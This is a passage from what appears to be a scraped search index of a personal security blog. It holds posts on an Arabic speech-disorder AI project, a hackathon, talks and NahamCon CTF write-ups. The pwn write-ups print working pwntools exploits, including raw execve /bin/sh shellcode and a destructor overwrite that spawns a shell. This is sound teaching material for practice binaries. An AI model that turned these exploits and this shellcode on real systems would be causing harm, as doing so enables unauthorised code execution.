r11[r6]; r15 = r30[r15]; r14 = r31[r14]; r13 = r13[r12]; r12 = r11[r6]; r11 = r30[r10]; r10 = r30[r10]; r9 = r30[r9]; r7 = r30[r7]; r6 = r29[r6]; r2 = r28 + r2; r2 = r2 + r27; r2 = r2 + r26; r2 = r2 + r25; r2 = r2 + r24; r2 = r2 + r23; r2 = r2 + r22; r2 = r2 + r21; r2 = r2 + r20; r2 = r2 + r19; r2 = r2 + r18; r1 = r17 + r1; r1 = r1 + r16; r1 = r1 + r15; r1 = r1 + r14; r1 = r1 + r13; r1 = r1 + r12; r1 = r1 + r11; r1 = r1 + r10; r1 = r1 + r9; r1 = r1 + r7; r1 = r1 + r6; I could recognize this immediatly as some sort of dynamic string construction, so I just threw it in a js repl.\n","description":"A mobile challenge from the CyCTF'23 Qualification where you have to hack a react native apk","id":4,"section":"posts","tags":["CTF"],"title":"Reactive Vault 1","uri":"https://hegzploit.github.io/posts/reactive-vault-1/"},{"content":"This is a blog post about my graduation project, where I went for a little dive within the scary realm of AI. I had zero practical experience with AI prior and had only a minimal theoretical understanding of some concepts. While this work may not seem like much, this was a rough ride for me, and I can confidently say that it was worth it. I couldn\u0026rsquo;t have had the opportunity to do this type of work otherwise, and I will probably not touch AI at this level anytime soon. This is basically a brain dump of some of my thoughts, including an explanation of my project so I can have some peace of mind and move on.\nIntroduction Artificial Intelligence has been prevalent lately. This can be accounted for many reasons, but the most important is Moore\u0026rsquo;s Law. The amount of compute power available to the average user, let alone big corporations such as Microsoft and Facebook, is way more than what we could get in the \u0026rsquo;90s.\nThis becomes clear when we observe the nature of the current state-of-the-art trends in AI. The Transformer model, which was proposed by Vaswani et al. in 2017, rids of any feedback connections (RNNs) and only utilizes what they called \u0026ldquo;self-attention\u0026rdquo;. This operation is highly parallelizable and can exploit the large number of cores in modern GPUs.\nA popular GPU that is widely used in AI is the Nvidia A100 which has 6,912 CUDA cores. Its successor, the H100, has 18,432 CUDA cores! Overview of the project Our project addresses the problem of articulation disorder diagnosis in the Arabic language. We take a multimodal approach to solve this problem. We first identify whether the disorder is of a physiological nature or not. This is achieved through a binary image classifier that is trained on public pictures of patients with a hare lip. We only chose hare lip for our prototype due to its abundance of data.\nOnce the patient has been classified to have an abnormality, we do nothing further. On the other hand, if the patient doesn\u0026rsquo;t have a physiological disorder, then we proceed to the second stage of the pipeline, which is the audio analysis phase. In this phase, the patient utters multiple words into a microphone that feeds into our AI model to further classify the patient\u0026rsquo;s articulation disorder (Lisp, Rhotacism, \u0026hellip;). The model was trained on data that we gathered locally.\nAfter the articulation disorder has been classified, the patient undergoes a written questionnaire that identifies whether the disorder could be due to psychological or social reasons.\nThe following picture shows an overview of the first experiments with the project. At a later stage in our project, we improved the audio pipeline by utilizing a transformer-based approach that performs Automatic Speech Recognition. This replaced the LSTM audio classification pipeline.\ngeneral diagram of an early phase of our system I will focus on the audio pipelines in this blog post. The image pipeline was the work of my friend Mostafa, while the questionnaire was the work of Seif.\nNLP in AI and History NLP has been a target of AI for a very long time. In the following paragraphs, we will go through some of the history to get a better context on what we are currently targeting.\nNatural languge can be expressed in two main forms\nText form Audio form Both of these forms have one thing in common: their output depends on past input. Modeling this type of system is tricky. We need a model that can represent this causal relationship between input and output.\nThis is where we start using the recurrent neural network to model our data. The RNN is a type of neural network that has feedback. This is necessary to model natural language since the network\u0026rsquo;s output depends on past input.\nSource: https://colah.github.io/posts/2015-08-Understanding-LSTMs/ This network architecture proved to be problematic when dealing with very large data sizes. This is due to the failure of the model to capture information that is far away from the current word due to the vanishing gradient problem.\nIn 1997, a research paper was published that introduced a new RNN architecture called the \u0026ldquo;Long Short-Term Memory\u0026rdquo; (LSTM). This architecture dealt with the vanishing gradient problem by introducing a gating mechanism inside the cells of the network. This enables us to control the gradient flow within the cell so we can prevent the gradient from vanishing or exploding.\nUp to this point, we could use LSTMs to predict new data from past data. However, we had always struggled with sequence-to-sequence learning. This was a very special task in NLP that involved transforming an input sequence to an output sequence. The most popular sequence-to-sequence task is machine translation, where we transform a sequence of words in a certain language to another sequence of words in another language.\nIn 2014, researchers from Google published a paper that proposed a new network architecture that could deal with sequence-to-sequence tasks: The encoder-decoder architecture.\nThe idea is to use one LSTM, the encoder, to read the input sequence one timestep at a time, to obtain a large fixed dimensional vector representation (a context vector), and then to use another LSTM, the decoder, to extract the output sequence from that vector. The second LSTM is essentially a recurrent neural network language model except that it is conditioned on the input sequence.1\nBeyond LSTMs: Attention and Transformers However, even though LSTMs could now capture longer dependencies and perform Seq2Seq tasks, they still struggled with retaining information for very long sequences. This was mainly due to the limited memory of LSTMs and their noise accumulation.\nIn 2014, a research intern at Montreal University published a paper where he proposed a new way to approach neural machine translation, addressing the limitation of the fixed-length context vector in the encoder-decoder architecture. Instead of relying solely on the final hidden state of the encoder, the attention mechanism allows the decoder to adaptively focus on different parts of the input sequence while generating the output sequence. This is done by learning a set of alignment weights between the input and output sequences. He called this new mechanism \u0026ldquo;Attention\u0026rdquo; and achieved state-of-the-art translation performance with his architecture.\nEverything up to this point still used LSTMs, which wasn\u0026rsquo;t all that great. We can observe that all the innovation that was done in 2014 was huge, and it started adding components to the LSTM: a component for the encoder and decoder, and another component for the attention mechanism. All of this was built on top of the trusty old LSTMs from the \u0026rsquo;90s.\nThree years into the future and we are now in 2017. Eight researchers from Google Brain published a disruptive paper in the field of AI. They proposed yet another new architecture that didn\u0026rsquo;t build upon the LSTM, as we have seen lately. Instead, it stripped the LSTM component entirely from the network architecture, keeping the encoder-decoder structure and the attention mechanism. They named the paper \u0026ldquo;Attention is All You Need,\u0026rdquo; in which they introduced the \u0026ldquo;Transformer\u0026rdquo; architecture.\nIt didn\u0026rsquo;t just solve the problem of representing longer sequences; it also was a beast of transfer learning, unlike the LSTMs. One can take a general-purpose transformer and fine-tune it with so little data to achieve state-of-the-art results in their specialized application.\nThis also meant that we no longer have to train models from scratch each time we need to solve a specific problem. If there\u0026rsquo;s a transformer model that can deal with the problem even at a general level, probably fine-tuning is the way to go. This became very popular in the field of Automatic Speech Recognition (ASR) systems. We started witnessing big transformer models trained on decades of audio data that people fine-tuned for their specific use case or language.\nBack to the present: LSTMs I\u0026rsquo;m going to quickly go over our experiments with training an LSTM classifier for our problem. We had three classes of articulation disorders:\nLisp Rhotacism No Disorder We wanted a model to identify the disorder from an audio sample (an uttered word in audio form). We had no data and couldn\u0026rsquo;t find any Arabic audio data of children with articulation disorders online, so we started gathering data manually. We approached local medical centers and nurseries. After dealing with a lot of trouble trying to explain the project, getting consent from parents, and setting up our equipment, we started gathering data.\nTedious days of data gathering went by. Initially, we had around 2 hours of raw recordings. Then came cleaning, which was followed by labeling, which we split amongst our team. We ended up with around 15 minutes of audio data :loudly_crying_face:. This seemed so little, but we kept going anyway.\ndata gathering adventures! We kept experimenting with different model hyperparameters on our dataset, but every single try showed a sign of overfitting. It became clear that we could no longer progress further with the little data that we have, and hence we started with plan B.\nexample of one of our training runs overfitting after 10 epochs Plan B: Transformers I was always interested in transformers. I was initially planning to fine-tune a transcription model like Whisper by OpenAI on the little data that I have, but I was very skeptical it would make any difference fine-tuning such a huge model on my 15 minutes of data.\nI was chatting about this Whisper fine-tuning dilemma with my friend Mohey (he\u0026rsquo;s the AI expert I know \u0026#x1f9e0;) when he suggested I just transcribe the audio with the Whisper model and transform my classification problem to just an audio transcription problem. This was basically the beginning of the end for my graduation project.\nAfter looking around for the hottest fine-tuned models for the Arabic language, I saw the amazing work of ArabML in the Whisper fine-tuning event by Hugging Face. They had fine-tuned a model that achieved a WER of 12.04, and it was on an Arabic dataset of the Egyptian dialect. That was exactly what I needed, so I started experimenting with the model through the free Hugging Face inference API. It didn\u0026rsquo;t transcribe the incorrect words very accurately, most likely due to word normalization that is associated with automatic speech recognition (ASR) models, but it was something I could work with.\nhuggingface🤗 fine-tuning event leaderboard I created a list of all the possible wrong words (that have articulation errors) that we could face along with the corresponding correct words, as shown in the image below.\nlist of all the possible error words along with the corresponding correct words After creating this list, we just feed the transcribed text to an algorithm that can find the closest match from our words list. This process is repeated for all the uttered words, and we have a list of all the wrong words that were uttered along with their corresponding correct word. The letter difference between these two words will be the substituted letter.\nBlock diagram of the final pipeline using ASR transformer screenshot of the frontend This pipeline was implemented in Python with a simple Flask frontend. You can find all the corresponding code in my GitHub repo MAD-Whisper.\nSpecial Thanks I would like to thank everyone who has helped me with this small research project, and especially my team for being such strong supporters during our journey. I am also grateful for their patience with my frequent tantrums throughout the past year, so a huge thanks go to both Mostafa and Seif!\nMostafa, Me and Seif after our thesis presentation and defense. (from right to left) Additionally, I would love to thank Mohey for being an awesome, well-rounded nerd. Credit goes to him for the crazy ASR transformer idea. I truly enjoyed our discussions and learned a lot from them.\nThanks to ARABML community for their astounding open-source research, and specifically their whisperar initiative and models which I have used within my project.\nFinally, thanks to our project advisor, Dr. Mohamed Safy, for supporting our project and for connecting us with medical specialists whom we consulted during our project.\nMe with Dr. Safy Bonus excerpt from my presentation\nhttps://paperswithcode.com/method/seq2seq\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","description":"I talk about AI and NLP in the context of my graduation project.","id":5,"section":"posts","tags":["misc"],"title":"An Electrical Engineer's Adventure into the Deep Dark of AI","uri":"https://hegzploit.github.io/posts/gp/"},{"content":"Are you ready to put your coding skills to the ultimate test? Hacktrick is the hackathon that combines AI, problem-solving, and cybersecurity to create a thrilling challenge. The landing page promises a rescue mission, but the real magic happens behind the scenes. As the competition heats up, we quickly realize that coding tricks alone won\u0026rsquo;t guarantee a win. The question is, will we figure out the winning formula before the time runs out?\nThis year\u0026rsquo;s problem statement is summarized as follows:\nHacktrick is an AI hackathon that requires participants to design and implement an agent that can rescue trapped children from a maze and carry them to safety while solving a security riddle for each child. The agent must navigate the maze, locate the trapped children, and find the shortest path to rescue them while avoiding obstacles. The evaluation criteria are based on the number of children rescued, the number of actions taken within the allotted time, and the efficiency in solving the riddles.\nYou can find more details here.\nCompeting teams were tasked with creating solver scripts to crack the codes of four different challenges, ranging from classical cipher decryption to pcap file analysis, JWT manipulation, and even automated captcha solving. These scripts were then used as callbacks to the maze-solver bot that we created. Some participants used fancy RL approaches, but we only had so much time left that we made a solution using the classical DFS.\nWe then recieved the scoring formula for the competition.\n$$Score = \\frac{Children_{Rescued} \\times 1000}{Actions} + \\frac{\\sum Riddle_{Score}}{\\sum Riddle\\ Solve\\ Time \\times 10}$$\nKeep in mind that every map will always have 4 children to rescue, each child will trigger one riddle with a max riddle score of 100.\nSubsituting these boundaries in the Score equation, we get the following.\n$$Score = \\frac{4000}{Actions} + \\frac{100}{\\sum Riddle\\ Solve\\ Time \\times 10}$$\nJudging by some of the leaderboard scores, It seems that most people managed to get 100 actions on average and a total riddle solve time of 1 second.\nA Plan in Action By calculating the gradient of the score function with respect to each of its parameters, we can gain insight into how each parameter affects the score function as a whole. It is very obvious that the riddle solving time has the greatest influence, but it never hurts to have some fun with math, does it?\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 import tensorflow as tf def score_func(A, T): # your scoring function return 4000/A + 100/(10*T) # Define the parameter values and convert them to TensorFlow variables A = tf.Variable(100.0) T = tf.Variable(1.0) # Compute the output of the scoring function using TensorFlow with tf.GradientTape() as tape: output = score_func(A, T) # Compute the partial derivatives of the output with respect to A and T dA, dT = tape.gradient(output, [A, T]) # Print the partial derivatives print(\u0026#34;Partial derivative of the output with respect to A:\u0026#34;, dA.numpy()) print(\u0026#34;Partial derivative of the output with respect to T:\u0026#34;, dT.numpy()) This showed that, on average, the riddle solving time had 25 times more influence on the score function than the actions taken (i.e., the rate of change of the score with respect to T is 25 times more than that of A). However, for us with our less performing algorithm that uses an average of 500 actions, we easily had over 625 relative sensitivity.\nOptimize to the Max Our plan was to save as many children as possible to trigger as many riddles as we could, and then solve the riddles in the fastest time possible. Our team started working on the algorithm and optimization simultaneously, and we implemented the following optimizations.\nCode Optimization Our solver scripts involved many third-party libraries. We started by benchmarking our runs and trying out various approaches. Here\u0026rsquo;s the result of the first run of our scripts on my own laptop before implementing any performance-related changes.\n1 2 3 4 5 6 7 CIPHER TIME = 2.5987625122070312e-05 CAPTCHA TIME = 0.09151816368103027 PCAP TIME = 0.03525257110595703 JWT TIME = 0.7002813816070557 Total Time Taken: 0.827078104019165 Est. Score: 12.09075654573039 One significant time waste was the JWT script, which accounted for ~85% of our total time. This was due to the following function.\n1 2 3 4 5 def generate_key_pair(filename): key = RSA.generate(2048) public_key = key.publickey().export_key(\u0026#34;PEM\u0026#34;) private_key = key.export_key(\u0026#34;PEM\u0026#34;) return private_key, public_key Generating a 2048-bit key is a highly compute-intensive operation. No wonder it took so much time. We could reduce the key space to 1024, but that wouldn\u0026rsquo;t be significant. We need to aim higher, and the answer is in caching! The key pair was saved on disk and accessed using the following function.\n1 2 3 4 5 6 7 8 9 def load_key_pair(filename): \u0026#34;\u0026#34;\u0026#34; Load an existing RSA key pair from files. \u0026#34;\u0026#34;\u0026#34; with open(f\u0026#34;{filename}.pem\u0026#34;, \u0026#34;rb\u0026#34;) as f: private_key = f.read() with open(f\u0026#34;{filename}.pub\u0026#34;, \u0026#34;rb\u0026#34;) as f: public_key = f.read() return private_key, public_key This little optimization got us an order of magnitude faster!\n1 2 3 4 5 6 7 CIPHER TIME = 3.170967102050781e-05 CAPTCHA TIME = 0.14008831977844238 PCAP TIME = 0.04384732246398926 JWT TIME = 0.020376920700073242 Total Time Taken: 0.2043442726135254 Est. Score: 48.937021195171525 Optimizing Our Python Implementation We initially tried using PyPy, which only slowed us down. However, after aboeleyes suggested that we try using Python 3.11, we spent a lot of time compiling OpenSSL and Python 3.11. Eventually, we managed to achieve another 55% performance increase!\n1 2 3 4 5 6 7 CAPTCHA TIME = 0.08152127265930176 CIPHER TIME = 6.4849853515625e-05 JWT TIME = 0.013359308242797852 PCAP TIME = 0.024926185607910156 Total Time Taken: 0.11987161636352539 Est. Score: 83.42258412261475 Network Latency Optimization To ensure that our optimized code was not ruined, we also had to make sure that the network could quickly deliver our solutions to the hackathon\u0026rsquo;s server. We began by querying a WHOIS lookup on the hackathon\u0026rsquo;s backend IP address which is hosting the maze.\nHow lucky was that? I went straight to my AWS panel, changed my region to Stockholm, Sweden, and launched an instance in the same subnet as the hackathon\u0026rsquo;s server. I chose a c6n.large instance, which is advertised as \u0026ldquo;ideal for high compute and bandwidth applications.\u0026rdquo; It had a whopping 25 Gbps of speed.\nResults and Rant After hacking for six hours with my team on Google Meet, we had a maze bot that was working, though not perfectly. It literally had one job and It is to save as many children as possible and hit as many riddles as It could, so our optimized solvers could go into action. We wrapped up after giving up on fixing some backtracking bugs and ran our solver on the remote machine. (Oh, did I mention that we only had one attempt at this? Yes, we did, due to me accidentally wasting four of our five attempts. \u0026#x1f648;)\nWe got a whopping #3, though we had only managed to solve 3 out of the 4 riddles but we got some really good timings (We even managed to solve the Cipher riddle in less than 0.01 seconds which apparently is rounded down to 0 on their leaderboard \u0026#x1f608;), I\u0026rsquo;m not sure how #1 managed to get these solve times without hardcoding their solution to be honest, these were some impressive number regardless of their legitimacy.\nSome Drama and More Ranting The last bummer is our disqualfiication.\nWe were as surprised as you when we saw this, though when we reached out we didn\u0026rsquo;t get anything useful in response lmao.\nWe double checked the version of our solver script that we sent them in the last minute (they requested that all hackathon teams send their solver scripts via email so they can make sure of their solution\u0026rsquo;s legitimacy) and we noticed that we did a last minute change to our solver and forgot to send them the new version of the script, It\u0026rsquo;s literally two lines of code that were moved under a new scope, I even sent them the diff with the latest version after the deadline but I got ignored (what?), I think the organizers should have reached out to teams before disqualifying them. Unfortunately, there is a significant mistake with their judging process as they only assess submissions based on the code and do not consider other crucial factors such as the environment that the code ran in. Nonetheless, we do not care that much to be honest, as we enjoyed the journey regardless of the destination. Hopefully, the organizers will learn from their mistakes for next year\u0026rsquo;s hackathon.\nmfw Literally Hacking the Hackathon\nShoutouts Big shoutout to Abdulrahman Wael, Ibrahim Aboeleinen and Maria Gamal It was very fun hacking together the last couple of days.\n","description":"I recently participated in a hackathon with my team, where we faced multiple challenges, including solving riddles and optimizing our algorithms. We ended up achieving a high ranking and learned valuable lessons about optimization and problem-solving along the way.","id":6,"section":"posts","tags":["misc"],"title":"Hacking the Hackathon: How We Optimized Our Way to Third Place","uri":"https://hegzploit.github.io/posts/hacking-the-hackathon/"},{"content":"tl;dr, My real name is Yusuf Hegazy. I graduated in 2023 from the Faculty of Electronics and Communication Engineering, Electrical Engineering Department.\nI have two years of experience in the cybersecurity industry. I began my career as a penetration tester at a local consultancy during my senior year of university. After completing my bachelor\u0026rsquo;s degree, I transitioned into a role as a Product Operations Engineer at CyberDefenders, a leading platform for blue team training and certification. Currently, I am a fulltime researcher pursuing a PhD in Computer Science at the University of Birmingham, specializing in hardware security, with a focus on side-channel analysis and leakage modeling.\nIn my free time, I create technical content on YouTube in my native language and occasionally write blogs. I also enjoy tinkering with electronics and hardware and participating in Capture The Flag (CTF) competitions, with a focus on pwn and reverse engineering challenges. Occasionally, I write code purely for fun.\n","description":"about me","id":7,"section":"","tags":null,"title":"$ whoami","uri":"https://hegzploit.github.io/about/"},{"content":"Recording is sadly corrup, here\u0026rsquo;s the slides.\nSlides: https://hegz.me/how2hack.pdf\n","description":"Basic introduction to cybersecurity","id":8,"section":"talks","tags":null,"title":"Getting Started with Cybersecurity","uri":"https://hegzploit.github.io/talks/how2hack/"},{"content":" Slides: https://hegz.me/binex.pdf\n","description":"","id":9,"section":"talks","tags":["pwn"],"title":"Once upon a Segfault","uri":"https://hegzploit.github.io/talks/once_upon_a_segfault/"},{"content":"Checksec Canary : ✘ NX : ✓ PIE : ✘ Fortify : ✘ RelRO : Full We only care about the stack canary as we will be overflowing RIP to control execution flow, and thankfully It\u0026rsquo;s disabled.\nExploitation 1. RIP Control We overflow the binary with a cyclic pattern, however, for this being a 64-bit binary we can\u0026rsquo;t overflow RIP with a non-canonical address.\nCanonical Address An address is said to be canonical in the 64-bit world when the upper 16 bits are copies of the 48th bit. The easiest way to find the RIP offset without overflowing RIP is by breaking at the ret instruction and searching for our pattern in rsp.\n2. Writing our exploit Now we have all the pieces that we need to build our exploit, we will do the rest straight from pwntools.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 from pwn import * context.binary = e = ELF(\u0026#34;./babiersteps\u0026#34;) context.encoding = \u0026#39;latin\u0026#39; if args[\u0026#39;REMOTE\u0026#39;]: pass else: io = e.process() OFFSET = 120 io.clean() io.fit( {120: e.sym.win} ) io.interactive() ","description":"A classic ret2win challenge on a 64-bit binary, overflow RIP with win() address to get flag.","id":10,"section":"writeups","tags":["pwn","NahamCTF22"],"title":"Babiersteps","uri":"https://hegzploit.github.io/writeups/babiersteps/"},{"content":"Checksec It\u0026rsquo;s an aboslute mess, nothing is turned on fortunately :)\nCanary : ✘ NX : ✘ PIE : ✘ Fortify : ✘ RelRO : Partial Exploitation 1. EIP Control We obtain our offset very easily in GEF.\n2. Exploitation We start by analyzing the stack at the overflown state.\nLooking at the registers, It appears that only two registers point to our stack. eax and esp.\nWe search for gadgets jumping to any of these registers.\ngef➤ ropper --search jmp [INFO] Load gadgets from cache [LOAD] loading... 100% [LOAD] removing double gadgets... 100% [INFO] Searching for gadgets: jmp [INFO] File: /home/hegz/HDD/Cyber/CTF/NahamCon/Babysteps/babysteps 0x08049545: jmp eax; We find a jmp eax gadget, this is perfect.\neax seems to point to the start of our buffer too.\nKnowing that our offset to EIP is 28-bytes, this leaves us with two options:\nSqueeze a shellcode in these 28 bytes and execute it by jumping to the start of the buffer using the jmp eax gadget. Write our shellcode after the 28 bytes and pad the buffer with a NOP sled to our shellcode. Option 1 wasn\u0026rsquo;t successful due to the length of most execve shellcodes, the smallest execve shellcode I could find was 24-bytes in size and It leveraged the stack to expand further beyod these 24-bytes using multiple push instructions, this made my shellcode overflow itself, hence I was screaming at my keyboard on twitter.\nyou know you should stop when your overflown shellcode overflows itself...\n\u0026mdash; hegz (@hegzploit) April 29, 2022 This lead us to just pad the buffer with nops and put our shellcode after EIP.\nHere\u0026rsquo;s our exploit.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 from pwn import * context.binary = e = ELF(\u0026#34;./babysteps\u0026#34;) context.encoding = \u0026#39;latin\u0026#39; if args[\u0026#39;REMOTE\u0026#39;]: io = remote(\u0026#34;challenge.nahamcon.com\u0026#34;, 30369) elif args[\u0026#39;GDB\u0026#39;]: # Breaks at RTN instruction. io = gdb.debug(context.binary.path, f\u0026#34;\u0026#34;\u0026#34; b *0x080492d0 \u0026#34;\u0026#34;\u0026#34;) else: io = e.process() OFFSET = 28 jmp_eax = 0x08049545 # Shellcode from http://shell-storm.org/shellcode/files/shellcode-811.php shellcode = b\u0026#34;\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80\u0026#34; io.clean(0.5) io.fit( {OFFSET : p32(jmp_eax), OFFSET + 4 * 5 : shellcode}, filler=b\u0026#34;\\x90\u0026#34;) io.interactive() ","description":"A classic ret2shellcode with a twist, we use a gadget to execute our code off the stack. binary is 32-bit.","id":11,"section":"writeups","tags":["pwn","NahamCTF22"],"title":"Babysteps","uri":"https://hegzploit.github.io/writeups/babysteps/"},{"content":"Checksec Canary : ✓ NX : ✓ PIE : ✘ Fortify : ✘ RelRO : ✘ RelRO is completely disabled unlike any other challenge we have encountered, this means that we have write permessions to all the relocations.\nExploitation Running the binary will let us specify an address and a value and then It will assign that value to the adderss we provided.\nhegz@pop-os$ ./detour What: 1234 Where: 123123123213 Segmentation fault (core dumped) I confirmed this by analyzing the binary in ghidra, below is the decompilation.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 undefined8 main(void) { long in_FS_OFFSET; size_t local_20; long local_18; long local_10; local_10 = *(long *)(in_FS_OFFSET + 0x28); printf(\u0026#34;What: \u0026#34;); __isoc99_scanf(\u0026amp;DAT_00402013,\u0026amp;local_20); getchar(); printf(\u0026#34;Where: \u0026#34;); __isoc99_scanf(\u0026amp;DAT_0040201f,\u0026amp;local_18); getchar(); *(size_t *)((long)\u0026amp;base + local_18) = local_20; if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } return 0; } This is the part responsible of the write-what-where.\n1 *(size_t *)((long)\u0026amp;base + local_18) = local_20; It basically means that It will write the value we provide in local_20 at the address we provide at local_18 incremented by the address of base, this is important when crafting our exploit as we have to subtract the address of base from the address we provide to get the correct address in the binary.\nWe also have a function that will execute a shell in our binary.\n1 2 3 4 5 6 void win(void) { system(\u0026#34;/bin/sh\u0026#34;); return; } Now we only need to locate the address that we will be writing to in order to redirect execution to our win() function.\nThe GOT is one good attack vector but we don\u0026rsquo;t call any libc function (except __stack_chk_fail) after our write-what-where, this means that overwriting the GOT is useless since the overwritten GOT entry will never be referenced anyway.\nThe less obvious attack vector is the global destructor for our program, this is possible due the fact that we have write permissions to the binary relocations.\nThe global destructor is a routine that gets called when our main function is exiting.\nHere is the backtrace of the binary after successfully ovewrwriting the global destructor.\n1 2 3 4 5 6 7 8 9 10 [#0] 0x7ffff7e5c6ea → __GI___wait4(pid=0xddb6b, stat_loc=0x7fffffffd8d8, options=0x0, usage=0x0) [#1] 0x7ffff7e5c6ab → __GI___waitpid(pid=\u0026lt;optimized out\u0026gt;, stat_loc=0x7fffffffd8d8, options=0x0) [#2] 0x7ffff7dc394b → do_system(line=\u0026lt;optimized out\u0026gt;) [#3] 0x40121d → win() [#4] 0x7ffff7fd9f03 → _dl_fini() [#5] 0x7ffff7db84e5 → __run_exit_handlers(status=0x0, listp=0x7ffff7f8c818 \u0026lt;__exit_funcs\u0026gt;, run_list_atexit=0x1, run_dtors=0x1) [#6] 0x7ffff7db8660 → __GI_exit(status=\u0026lt;optimized out\u0026gt;) [#7] 0x7ffff7d9cfd7 → __libc_start_call_main(main=0x401220 \u0026lt;main\u0026gt;, argc=0x1, argv=0x7fffffffde88) [#8] 0x7ffff7d9d07d → __libc_start_main_impl(main=0x401220 \u0026lt;main\u0026gt;, argc=0x1, argv=0x7fffffffde88, init=\u0026lt;optimized out\u0026gt;, fini=\u0026lt;optimized out\u0026gt;, rtld_fini=\u0026lt;optimized out\u0026gt;, stack_end=0x7fffffffde78) [#9] 0x40111e → _start() It is present in the .fini_array section under the symbol name __do_global_dtors_aux_fini_array_entry\nTime to craft our exploit.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 from pwn import * context.binary = e = ELF(\u0026#34;./detour\u0026#34;) context.encoding = \u0026#39;latin\u0026#39; if args[\u0026#39;REMOTE\u0026#39;]: io = remote(\u0026#34;challenge.nahamcon.com\u0026#34;, 32149) elif args[\u0026#39;GDB\u0026#39;]: # Breaks at RTN instruction. io = gdb.debug(context.binary.path, f\u0026#34;\u0026#34;\u0026#34; b *main+143 \u0026#34;\u0026#34;\u0026#34;) else: io = e.process() what = str(e.symbols.win) where = str(e.sym.__do_global_dtors_aux_fini_array_entry - e.sym.base) info(f\u0026#34;Overwriting: {where} with {what}\u0026#34;) io.clean(1) io.sendline(what) io.clean(1) io.sendline(where) io.interactive() ","description":"A write-what-where scenario that enables us to overwrite the destructor (dtor) in the relocations table with our win() function to get a shell.","id":12,"section":"writeups","tags":["pwn","NahamCTF22"],"title":"Detour","uri":"https://hegzploit.github.io/writeups/detour/"},{"content":" Serial Output 00110011 00111001 00110100 00110010 00101110 00110100 01100100 01100011 00110111 01101101 01100101 01100111 01100010 00110110 00110011 01100110 01100010 01100001 00110111 01100100 01100100 01100000 00110011 01100010 00110110 01100110 00110000 01100111 00110011 01100011 01100111 01100111 00110001 01101101 01100001 00110111 00110110 00101000 Wiring Diagram Arduino Code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 char * flag = \u0026#34;REDACTED\u0026#34;; String curr, first, second; int in1=29, in2=27, in3=25, in4=23; int out1=53, out2=51, out3=49, out4=47; int i; String get_output(String bits) { String output; digitalWrite(out1, ((bits[0] == \u0026#39;1\u0026#39;)? HIGH : LOW)); digitalWrite(out2, ((bits[1] == \u0026#39;1\u0026#39;)? HIGH : LOW)); digitalWrite(out3, ((bits[2] == \u0026#39;1\u0026#39;)? HIGH : LOW)); digitalWrite(out4, ((bits[3] == \u0026#39;1\u0026#39;)? HIGH : LOW)); delay(1000); output += String(digitalRead(in1)); output += String(digitalRead(in2)); output += String(digitalRead(in3)); output += String(digitalRead(in4)); return output; } //converts a given number into binary String binary(int number) { String r; while(number!=0) { r = (number % 2 == 0 ? \u0026#34;0\u0026#34; : \u0026#34;1\u0026#34;)+r; number /= 2; } while ((int) r.length() \u0026lt; 8) { r = \u0026#34;0\u0026#34;+r; } return r; } void setup() { i = 0; pinMode(out1, OUTPUT); pinMode(out2, OUTPUT); pinMode(out3, OUTPUT); pinMode(out4, OUTPUT); pinMode(in1, INPUT); pinMode(in2, INPUT); pinMode(in3, INPUT); pinMode(in4, INPUT); Serial.begin(9600); } void loop() { if (i \u0026lt; strlen(flag)) { curr = binary(flag[i]); first = curr.substring(0,4); second = curr.substring(4,8); Serial.print(get_output(first)); Serial.println(get_output(second)); delay(1000); i++; } } Looking at the code we can break it down into a couple of steps:\nloop over the flag covnerting each character into an 8-bit binary number split the 8-bit binary number to two 4-bit binary numbers perform a series of XOR operations that are hardwired in the wiring diagram to each 4-bits. print the XOR\u0026rsquo;d 8-bit binary number to the serial Refering to the datasheet of the XOR chip and the wiring diagram, we could identify our inputs and outputs and model the circuit in python.\nHere\u0026rsquo;s the pinout of the chip.\nXOR is a reversible operation so we can easily pass the encrypted flag to the encryption algorithm to get it decrypted.\nBelow is the decryption script.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 #!/usr/bin/env python3 # This function will decode a 4-bit binary number passed as a string def decode(bin_int): in1, in2, in3, in4 = [i for i in bin_int] out2 = int(in2) ^ 1 out1 = int(in1) ^ 0 out3 = 0 ^ int(in3) out4 = 1 ^ int(in4) out = [] out.append(out1) out.append(out2) out.append(out3) out.append(out4) out = [str(i) for i in out] return \u0026#34;\u0026#34;.join(out) # wrapper for the decode() function that splits a 8-bit binary number and # passes it to the decoding function returning the decrypted number. def trans(big_bin): bin1, bin2 = big_bin[:len(big_bin)//2], big_bin[len(big_bin)//2:] return(int(decode(bin1) + decode(bin2), 2)) flag = [] with open(\u0026#34;output.txt\u0026#34;) as f: encrypted = f.read().split() flag = [chr(trans(i)) for i in encrypted] print(\u0026#34;\u0026#34;.join(flag)) hegz@pop-os$ python3 solver.py flag{a16b8027cf374b115f7c3e2f622d84bc} ","description":"A hardware challenge where we're given some serial output from a Arduino and the corresponding wiring diagram and encryption source code.","id":13,"section":"writeups","tags":["pwn","NahamCTF22"],"title":"Dweeno","uri":"https://hegzploit.github.io/writeups/dweeno/"},{"content":"First Impressions I was really tempted to just plug that bad boy into my main PC, but I was worried It might do something funny, I didn\u0026rsquo;t rush and instead booted a trusy old HP Pavilion I had around and booted it up, and ran a quick lsblk to list the devices connected.\nWe can clearly see that sdb1 with 1.9TBs of storage, but is that all?\nDigging Deeper Fight Flash Fraud, or rather f3, is a suite of command line utilities that aids in detecting and verifying USB flash drives.\nIt consits of mutiple tools, mainly:\nf3probe\nThis runs a quick capacity test on the flash 